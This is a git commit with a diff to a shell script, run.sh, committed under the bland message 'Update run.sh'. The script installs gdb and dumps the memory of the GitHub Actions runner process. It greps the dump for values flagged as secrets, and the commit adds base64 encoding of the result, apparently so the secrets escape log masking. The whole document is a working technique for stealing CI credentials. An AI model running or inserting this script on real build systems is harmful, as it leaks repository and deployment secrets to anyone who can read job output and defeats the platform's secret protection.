5305d2d4880fdde32660ceb558a8e517762d9bce
Rui Costa <44004884+rui-costa@users.noreply.github.com>
2023-10-17 10:36:08 +0200

    Update run.sh

--- run.sh
+++ run.sh
@@ -2,4 +2,4 @@
 sudo apt update
 sudo apt install -y gdb
 sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
-grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump*
+grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump* | base64
